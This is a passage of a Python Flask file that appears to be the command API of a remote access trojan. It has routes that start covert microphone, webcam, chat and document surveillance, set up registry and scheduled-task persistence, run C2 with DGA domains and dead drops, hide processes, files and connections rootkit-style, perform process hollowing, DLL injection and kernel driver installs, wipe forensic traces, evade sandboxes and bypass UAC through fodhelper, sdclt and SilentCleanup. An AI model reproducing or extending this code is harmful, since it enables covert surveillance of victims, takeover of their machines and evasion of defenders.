        voice_activation = data.get('voice_activation', True)
        
        result = surveillance_suite.start_microphone_recording(duration, voice_activation)
        
        if result["success"]:
            log_event("surveillance", {
                "operation": "start_audio_recording",
                "duration_minutes": duration,
                "voice_activation": voice_activation
            }, pc_id)
        
        return jsonify(result)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/surveillance/webcam/start', methods=['POST'])
@require_auth
def start_webcam_capture():
    """Start webcam capture"""
    try:
        data = request.json or {}
        motion_detection = data.get('motion_detection', True)
        capture_interval = data.get('capture_interval', 5)
        
        result = surveillance_suite.start_webcam_capture(motion_detection, capture_interval)
        
        if result["success"]:
            log_event("surveillance", {
                "operation": "start_webcam_capture",
                "motion_detection": motion_detection,
                "capture_interval": capture_interval
            }, pc_id)
        
        return jsonify(result)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/surveillance/usb/start', methods=['POST'])
@require_auth
def start_usb_monitoring():
    """Start USB device monitoring"""
    try:
        result = surveillance_suite.start_usb_monitoring()
        
        if result["success"]:
            log_event("surveillance", {
                "operation": "start_usb_monitoring"
            }, pc_id)
        
        return jsonify(result)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/surveillance/printer/start', methods=['POST'])
@require_auth
def start_printer_monitoring():
    """Start printer job monitoring"""
    try:
        result = surveillance_suite.start_printer_monitoring()
        
        if result["success"]:
            log_event("surveillance", {
                "operation": "start_printer_monitoring"
            }, pc_id)
        
        return jsonify(result)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/surveillance/documents/start', methods=['POST'])
@require_auth
def start_document_monitoring():
    """Start document content analysis"""
    try:
        result = surveillance_suite.start_document_monitoring()
        
        if result["success"]:
            log_event("surveillance", {
                "operation": "start_document_monitoring"
            }, pc_id)
        
        return jsonify(result)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/surveillance/chat/start', methods=['POST'])
@require_auth
def start_chat_monitoring():
    """Start chat application monitoring"""
    try:
        result = surveillance_suite.start_chat_monitoring()
        
        if result["success"]:
            log_event("surveillance", {
                "operation": "start_chat_monitoring"
            }, pc_id)
        
        return jsonify(result)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/surveillance/stop', methods=['POST'])
@require_auth
def stop_all_surveillance():
    """Stop all surveillance activities"""
    try:
        result = surveillance_suite.stop_all_surveillance()
        
        if result["success"]:
            log_event("surveillance", {
                "operation": "stop_all_surveillance",
                "data_collected": result.get("data_collected", 0)
            }, pc_id)
        
        return jsonify(result)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/surveillance/data', methods=['GET'])
@require_auth
def get_surveillance_data():
    """Get collected surveillance data"""
    try:
        data_type = request.args.get('type')
        limit = int(request.args.get('limit', 100))
        
        result = surveillance_suite.get_surveillance_data(data_type, limit)
        return jsonify(result)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/surveillance/status', methods=['GET'])
@require_auth
def get_surveillance_status():
    """Get surveillance status"""
    try:
        result = surveillance_suite.get_surveillance_status()
        return jsonify(result)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

# Persistence Management Endpoints

@app.route('/api/persistence/establish', methods=['POST'])
@require_auth
def establish_persistence():
    """Establish all persistence mechanisms"""
    try:
        data = request.json or {}
        payload_path = data.get('payload_path')
        
        result = persistence_manager.establish_all_persistence(payload_path)
        
        if result["success"]:
            log_event("persistence", {
                "operation": "establish_all",
                "methods_established": result.get("total_methods", 0)
            }, pc_id)
        
        return jsonify(result)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/persistence/registry', methods=['POST'])
@require_auth
def establish_registry_persistence():
    """Establish registry persistence"""
    try:
        data = request.json or {}
        payload_path = data.get('payload_path')
        
        if not payload_path:
            return jsonify({"error": "payload_path required"}), 400
        
        result = persistence_manager.establish_registry_persistence(payload_path)
        
        if result["success"]:
            log_event("persistence", {
                "operation": "establish_registry",
                "methods_count": len(result.get("methods", []))
            }, pc_id)
        
        return jsonify(result)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/persistence/task', methods=['POST'])
@require_auth
def establish_task_persistence():
    """Establish scheduled task persistence"""
    try:
        data = request.json or {}
        payload_path = data.get('payload_path')
        
        if not payload_path:
            return jsonify({"error": "payload_path required"}), 400
        
        result = persistence_manager.establish_scheduled_task_persistence(payload_path)
        
        if result["success"]:
            log_event("persistence", {
                "operation": "establish_task",
                "task_name": result.get("task_name")
            }, pc_id)
        
        return jsonify(result)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/persistence/remove', methods=['POST'])
@require_auth
def remove_persistence():
    """Remove persistence mechanisms"""
    try:
        data = request.json or {}
        method_id = data.get('method_id')
        
        if method_id:
            result = persistence_manager.remove_persistence_method(method_id)
        else:
            result = persistence_manager.remove_all_persistence()
        
        if result["success"]:
            log_event("persistence", {
                "operation": "remove_persistence",
                "method_id": method_id or "all"
            }, pc_id)
        
        return jsonify(result)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/persistence/status', methods=['GET'])
@require_auth
def get_persistence_status():
    """Get persistence status"""
    try:
        result = persistence_manager.get_persistence_status()
        return jsonify(result)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

# Advanced C2 Endpoints

@app.route('/api/c2/initialize', methods=['POST'])
@require_auth
def initialize_c2():
    """Initialize C2 infrastructure"""
    try:
        data = request.json or {}
        primary_server = data.get('primary_server')
        backup_servers = data.get('backup_servers', [])
        
        if not primary_server:
            return jsonify({"error": "primary_server required"}), 400
        
        result = advanced_c2.initialize_c2_infrastructure(primary_server, backup_servers)
        
        if result["success"]:
            log_event("c2", {
                "operation": "initialize",
                "primary_server": primary_server,
                "backup_count": len(backup_servers)
            }, pc_id)
        
        return jsonify(result)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/c2/domains/generate', methods=['GET'])
@require_auth
def generate_dga_domains():
    """Generate DGA domains"""
    try:
        count = int(request.args.get('count', 10))
        domains = advanced_c2.generate_dga_domains(count)
        
        log_event("c2", {
            "operation": "generate_dga_domains",
            "count": len(domains)
        }, pc_id)
        
        return jsonify({
            "success": True,
            "domains": domains,
            "count": len(domains)
        })
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/c2/dead-drop', methods=['POST'])
@require_auth
def setup_dead_drop():
    """Setup dead drop communication"""
    try:
        data = request.json or {}
        platform = data.get('platform')
        credentials = data.get('credentials', {})
        
        if not platform:
            return jsonify({"error": "platform required"}), 400
        
        result = advanced_c2.setup_dead_drop_communication(platform, credentials)
        
        if result["success"]:
            log_event("c2", {
                "operation": "setup_dead_drop",
                "platform": platform
            }, pc_id)
        
        return jsonify(result)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/c2/command', methods=['POST'])
@require_auth
def execute_c2_command():
    """Execute C2 command"""
    try:
        command = request.json or {}
        
        if not command:
            return jsonify({"error": "command required"}), 400
        
        result = advanced_c2.execute_command(command)
        
        log_event("c2", {
            "operation": "execute_command",
            "command_type": command.get("type"),
            "success": result.get("success")
        }, pc_id)
        
        return jsonify(result)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/c2/status', methods=['GET'])
@require_auth
def get_c2_status():
    """Get C2 status"""
    try:
        result = advanced_c2.get_c2_status()
        return jsonify(result)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

# Rootkit Core Endpoints

@app.route('/api/rootkit/hide/process', methods=['POST'])
@require_auth
def hide_process():
    """Hide process from system enumeration"""
    try:
        data = request.json or {}
        target = data.get('target')
        
        if not target:
            return jsonify({"error": "target (process name or PID) required"}), 400
        
        result = rootkit_core.hide_process(target)
        
        if result["success"]:
            log_event("rootkit", {
                "operation": "hide_process",
                "target": target,
                "method": result.get("method")
            }, pc_id)
        
        return jsonify(result)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/rootkit/hide/file', methods=['POST'])
@require_auth
def hide_file():
    """Hide file from filesystem enumeration"""
    try:
        data = request.json or {}
        file_path = data.get('file_path')
        
        if not file_path:
            return jsonify({"error": "file_path required"}), 400
        
        result = rootkit_core.hide_file(file_path)
        
        if result["success"]:
            log_event("rootkit", {
                "operation": "hide_file",
                "file_path": file_path,
                "method": result.get("method")
            }, pc_id)
        
        return jsonify(result)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/rootkit/hide/registry', methods=['POST'])
@require_auth
def hide_registry_key():
    """Hide registry key from enumeration"""
    try:
        data = request.json or {}
        key_path = data.get('key_path')
        
        if not key_path:
            return jsonify({"error": "key_path required"}), 400
        
        result = rootkit_core.hide_registry_key(key_path)
        
        if result["success"]:
            log_event("rootkit", {
                "operation": "hide_registry_key",
                "key_path": key_path
            }, pc_id)
        
        return jsonify(result)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/rootkit/hide/network', methods=['POST'])
@require_auth
def hide_network_connection():
    """Hide network connection from netstat"""
    try:
        data = request.json or {}
        local_port = data.get('local_port')
        remote_ip = data.get('remote_ip')
        
        if not local_port:
            return jsonify({"error": "local_port required"}), 400
        
        result = rootkit_core.hide_network_connection(local_port, remote_ip)
        
        if result["success"]:
            log_event("rootkit", {
                "operation": "hide_network_connection",
                "local_port": local_port,
                "remote_ip": remote_ip
            }, pc_id)
        
        return jsonify(result)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/rootkit/inject/hollow', methods=['POST'])
@require_auth
def process_hollowing():
    """Perform process hollowing attack"""
    try:
        data = request.json or {}
        target_process = data.get('target_process')
        payload_path = data.get('payload_path')
        
        if not target_process or not payload_path:
            return jsonify({"error": "target_process and payload_path required"}), 400
        
        result = rootkit_core.process_hollowing(target_process, payload_path)
        
        if result["success"]:
            log_event("rootkit", {
                "operation": "process_hollowing",
                "target_process": target_process,
                "payload_path": payload_path
            }, pc_id)
        
        return jsonify(result)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/rootkit/inject/dll', methods=['POST'])
@require_auth
def dll_injection():
    """Inject DLL into target process"""
    try:
        data = request.json or {}
        target_pid = data.get('target_pid')
        dll_path = data.get('dll_path')
        
        if not target_pid or not dll_path:
            return jsonify({"error": "target_pid and dll_path required"}), 400
        
        result = rootkit_core.dll_injection(target_pid, dll_path)
        
        if result["success"]:
            log_event("rootkit", {
                "operation": "dll_injection",
                "target_pid": target_pid,
                "dll_path": dll_path
            }, pc_id)
        
        return jsonify(result)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/rootkit/kernel/driver', methods=['POST'])
@require_auth
def install_kernel_driver():
    """Install kernel driver for ring-0 access"""
    try:
        data = request.json or {}
        driver_path = data.get('driver_path')
        
        if not driver_path:
            return jsonify({"error": "driver_path required"}), 400
        
        result = rootkit_core.install_kernel_driver(driver_path)
        
        if result["success"]:
            log_event("rootkit", {
                "operation": "install_kernel_driver",
                "driver_path": driver_path,
                "ring_level": 0
            }, pc_id)
        
        return jsonify(result)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/rootkit/stealth/enable', methods=['POST'])
@require_auth
def enable_stealth_mode():
    """Enable comprehensive stealth mode"""
    try:
        result = rootkit_core.enable_stealth_mode()
        
        if result["success"]:
            log_event("rootkit", {
                "operation": "enable_stealth_mode",
                "hidden_processes": result.get("hidden_processes", 0),
                "hidden_files": result.get("hidden_files", 0)
            }, pc_id)
        
        return jsonify(result)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/rootkit/cleanup', methods=['POST'])
@require_auth
def anti_forensics_cleanup():
    """Perform anti-forensics cleanup"""
    try:
        result = rootkit_core.anti_forensics_cleanup()
        
        if result["success"]:
            log_event("rootkit", {
                "operation": "anti_forensics_cleanup",
                "actions_count": result.get("actions_count", 0)
            }, pc_id)
        
        return jsonify(result)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/rootkit/status', methods=['GET'])
@require_auth
def get_rootkit_status():
    """Get rootkit status"""
    try:
        result = rootkit_core.get_rootkit_status()
        return jsonify(result)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

# Advanced Evasion Endpoints

@app.route('/api/evasion/environment/check', methods=['POST'])
@require_auth
def comprehensive_environment_check():
    """Perform comprehensive environment analysis"""
    try:
        result = advanced_evasion.comprehensive_environment_check()
        
        if result["success"]:
            log_event("evasion", {
                "operation": "environment_check",
                "environment_safe": result["environment_safe"],
                "threat_score": result["threat_score"]
            }, pc_id)
        
        return jsonify(result)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/evasion/polymorphic/enable', methods=['POST'])
@require_auth
def enable_polymorphic_behavior():
    """Enable polymorphic code behavior"""
    try:
        result = advanced_evasion.enable_polymorphic_behavior()
        
        if result["success"]:
            log_event("evasion", {
                "operation": "enable_polymorphic",
                "modifications": result.get("modification_count", 0)
            }, pc_id)
        
        return jsonify(result)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/evasion/memory-only', methods=['POST'])
@require_auth
def enable_memory_only_execution():
    """Enable memory-only execution mode"""
    try:
        result = advanced_evasion.memory_only_execution()
        
        if result["success"]:
            log_event("evasion", {
                "operation": "memory_only_execution",
                "file_deleted": result.get("original_file_deleted", False)
            }, pc_id)
        
        return jsonify(result)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/evasion/anti-hooking', methods=['POST'])
@require_auth
def implement_anti_hooking():
    """Implement anti-hooking techniques"""
    try:
        result = advanced_evasion.implement_anti_hooking()
        
        if result["success"]:
            log_event("evasion", {
                "operation": "anti_hooking",
                "protection_level": result.get("protection_level")
            }, pc_id)
        
        return jsonify(result)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/evasion/status', methods=['GET'])
@require_auth
def get_evasion_status():
    """Get evasion status"""
    try:
        result = advanced_evasion.get_evasion_status()
        return jsonify(result)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

# Payload Obfuscation Endpoints

@app.route('/api/obfuscation/encrypt', methods=['POST'])
@require_auth
def multi_layer_encrypt():
    """Apply multiple layers of encryption to payload"""
    try:
        data = request.json or {}
        payload = data.get('payload')
        layers = data.get('layers', 3)
        
        if not payload:
            return jsonify({"error": "payload required"}), 400
        
        # Convert payload to bytes if string
        if isinstance(payload, str):
            payload_bytes = payload.encode('utf-8')
        else:
            payload_bytes = base64.b64decode(payload)
        
        result = payload_obfuscator.multi_layer_encrypt(payload_bytes, layers)
        
        if result["success"]:
            log_event("obfuscation", {
                "operation": "multi_layer_encrypt",
                "layers": layers,
                "original_size": result.get("original_size", 0)
            }, pc_id)
        
        return jsonify(result)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/obfuscation/code', methods=['POST'])
@require_auth
def obfuscate_python_code():
    """Obfuscate Python source code"""
    try:
        data = request.json or {}
        source_code = data.get('source_code')
        
        if not source_code:
            return jsonify({"error": "source_code required"}), 400
        
        result = payload_obfuscator.obfuscate_python_code(source_code)
        
        if result["success"]:
            log_event("obfuscation", {
                "operation": "obfuscate_code",
                "transformations": len(result.get("transformations", []))
            }, pc_id)
        
        return jsonify(result)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/obfuscation/polymorphic-loader', methods=['POST'])
@require_auth
def create_polymorphic_loader():
    """Create polymorphic loader"""
    try:
        data = request.json or {}
        payload = data.get('payload')
        
        if not payload:
            return jsonify({"error": "payload required"}), 400
        
        # Convert payload to bytes
        if isinstance(payload, str):
            payload_bytes = payload.encode('utf-8')
        else:
            payload_bytes = base64.b64decode(payload)
        
        result = payload_obfuscator.create_polymorphic_loader(payload_bytes)
        
        if result["success"]:
            log_event("obfuscation", {
                "operation": "create_polymorphic_loader",
                "loader_id": result.get("loader_id")
            }, pc_id)
        
        return jsonify(result)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/obfuscation/runtime-modify', methods=['POST'])
@require_auth
def runtime_code_modification():
    """Modify code at runtime"""
    try:
        result = payload_obfuscator.runtime_code_modification()
        
        if result["success"]:
            log_event("obfuscation", {
                "operation": "runtime_modification",
                "modifications": result.get("modification_count", 0)
            }, pc_id)
        
        return jsonify(result)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/obfuscation/anti-disassembly', methods=['POST'])
@require_auth
def anti_disassembly_protection():
    """Implement anti-disassembly techniques"""
    try:
        result = payload_obfuscator.anti_disassembly_protection()
        
        if result["success"]:
            log_event("obfuscation", {
                "operation": "anti_disassembly",
                "protection_level": result.get("protection_level")
            }, pc_id)
        
        return jsonify(result)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/obfuscation/status', methods=['GET'])
@require_auth
def get_obfuscation_status():
    """Get obfuscation status"""
    try:
        result = payload_obfuscator.get_obfuscation_status()
        return jsonify(result)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

# Advanced Privilege Escalation Endpoints

@app.route('/api/escalation/uac/fodhelper', methods=['POST'])
@require_auth
def uac_bypass_fodhelper():
    """UAC bypass using fodhelper.exe"""
    try:
        data = request.json or {}
        payload_path = data.get('payload_path')
        
        if not payload_path:
            return jsonify({"error": "payload_path required"}), 400
        
        result = privilege_escalator.uac_bypass_fodhelper(payload_path)
        
        if result["success"]:
            log_event("privilege_escalation", {
                "operation": "uac_bypass_fodhelper",
                "payload_path": payload_path
            }, pc_id)
        
        return jsonify(result)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/escalation/uac/computerdefaults', methods=['POST'])
@require_auth
def uac_bypass_computerdefaults():
    """UAC bypass using ComputerDefaults.exe"""
    try:
        data = request.json or {}
        payload_path = data.get('payload_path')
        
        if not payload_path:
            return jsonify({"error": "payload_path required"}), 400
        
        result = privilege_escalator.uac_bypass_computerdefaults(payload_path)
        
        if result["success"]:
            log_event("privilege_escalation", {
                "operation": "uac_bypass_computerdefaults",
                "payload_path": payload_path
            }, pc_id)
        
        return jsonify(result)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/escalation/uac/sdclt', methods=['POST'])
@require_auth
def uac_bypass_sdclt():
    """UAC bypass using sdclt.exe"""
    try:
        data = request.json or {}
        payload_path = data.get('payload_path')
        
        if not payload_path:
            return jsonify({"error": "payload_path required"}), 400
        
        result = privilege_escalator.uac_bypass_sdclt(payload_path)
        
        if result["success"]:
            log_event("privilege_escalation", {
                "operation": "uac_bypass_sdclt",
                "payload_path": payload_path
            }, pc_id)
        
        return jsonify(result)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/escalation/uac/silentcleanup', methods=['POST'])
@require_auth
def uac_bypass_silentcleanup():
    """UAC bypass using SilentCleanup task"""
    try:
        data = request.json or {}
        payload_path = data.get('payload_path')
        
        if not payload_path:
            return jsonify({"error": "payload_path required"}), 400
        
        result = privilege_escalator.uac_bypass_silentcleanup(payload_path)
        
        if result["success"]:
            log_event("privilege_escalation", {
                "operation": "uac_bypass_silentcleanup",
                "payload_path": payload_path
            }, pc_id)
        
        return jsonify(result)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/escalation/token/impersonation', methods=['POST'])
@require_auth
def token_impersonation():
    """Token impersonation attack"""
    try:
        data = request.json or {}
        target_process = data.get('target_process', 'winlogon.exe')
        
        result = privilege_escalator.token_impersonation_attack(target_process)
        
        if result["success"]:
            log_event("privilege_escalation", {
                "operation": "token_impersonation",
                "target_process": target_process
            }, pc_id)
        
        return jsonify(result)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/escalation/namedpipe', methods=['POST'])
@require_auth
def named_pipe_impersonation():
    """Named pipe impersonation attack"""
    try:
        data = request.json or {}
        pipe_name = data.get('pipe_name', 'TestPipe')
        
        result = privilege_escalator.named_pipe_impersonation(pipe_name)
        
        if result["success"]:
            log_event("privilege_escalation", {
                "operation": "named_pipe_impersonation",
                "pipe_name": pipe_name
            }, pc_id)
        
        return jsonify(result)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/escalation/service', methods=['POST'])
@require_auth
def service_escalation():
    """Service escalation attack"""
    try:
        data = request.json or {}
        service_name = data.get('service_name')
        
        result = privilege_escalator.service_escalation_attack(service_name)
        
        if result["success"]:
            log_event("privilege_escalation", {
                "operation": "service_escalation",
                "service_name": service_name
            }, pc_id)
        
        return jsonify(result)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/escalation/dll-hijacking', methods=['POST'])
@require_auth
def dll_hijacking_escalation():
    """DLL hijacking escalation"""
    try:
        data = request.json or {}
        target_executable = data.get('target_executable')
        malicious_dll = data.get('malicious_dll')
        
        if not target_executable or not malicious_dll:
            return jsonify({"error": "target_executable and malicious_dll required"}), 400
        
        result = privilege_escalator.dll_hijacking_escalation(target_executable, malicious_dll)
        
        if result["success"]:
            log_event("privilege_escalation", {
                "operation": "dll_hijacking_escalation",
                "target_executable": target_executable
            }, pc_id)
        
        return jsonify(result)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/escalation/comprehensive', methods=['POST'])
@require_auth
def comprehensive_escalation():
    """Attempt comprehensive privilege escalation"""
    try:
        data = request.json or {}
        payload_path = data.get('payload_path')
        
        if not payload_path:
            return jsonify({"error": "payload_path required"}), 400
        
        result = privilege_escalator.comprehensive_escalation_attempt(payload_path)
        
        if result["success"]:
            log_event("privilege_escalation", {
                "operation": "comprehensive_escalation",
                "successful_methods": result.get("successful_methods", []),
                "success_rate": result.get("success_rate", 0)
            }, pc_id)
        
        return jsonify(result)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/escalation/status', methods=['GET'])
@require_auth
def get_escalation_status():
    """Get privilege escalation status"""
    try:
        result = privilege_escalator.get_escalation_status()
        return jsonify(result)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

# Silent Elevation Endpoints

@app.route('/api/elevation/silent', methods=['POST'])
@require_auth
def attempt_silent_elevation():
    """Attempt silent privilege elevation without user interaction"""
    try:
        result = silent_elevation.attempt_silent_elevation()
        
        if result["success"]:
            log_event("silent_elevation", {
                "operation": "silent_elevation_attempt",
                "successful_methods": result.get("successful_methods", 0),
                "elevated": result.get("elevated", False)
            }, pc_id)
        
        return jsonify(result)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/elevation/auto', methods=['POST'])
@require_auth
def auto_elevate():
    """Automatically elevate on startup"""
    try:
        result = silent_elevation.auto_elevate_on_startup()
        
        if result["success"]:
            log_event("silent_elevation", {
                "operation": "auto_elevate",
                "elevated": result.get("elevated", False)
            }, pc_id)
        
        return jsonify(result)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/elevation/status', methods=['GET'])
@require_auth
def get_elevation_status():
    """Get silent elevation status"""
    try:
        result = silent_elevation.get_elevation_status()
        return jsonify(result)
    except Exception as e:
        return jsonify({"error": str(e)}), 500